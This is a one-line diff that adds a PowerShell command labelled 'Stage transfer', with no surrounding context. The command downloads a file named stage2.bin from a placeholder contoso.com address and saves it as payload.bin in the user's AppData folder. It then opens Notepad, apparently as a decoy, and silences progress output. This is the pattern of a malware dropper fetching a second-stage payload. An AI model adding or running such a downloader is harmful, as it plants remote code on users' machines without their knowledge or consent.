@@ -1,0 +1,1 @@
+<# Stage transfer #> $TransferUrl = "https://contoso.com/cdn/stage2.bin"; $Stage2Path = "$env:APPDATA\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($TransferUrl, $Stage2Path); Start-Process -FilePath "notepad.exe"; Set-Location -Path $env:TEMP; $ProgressPreference = "SilentlyContinue"
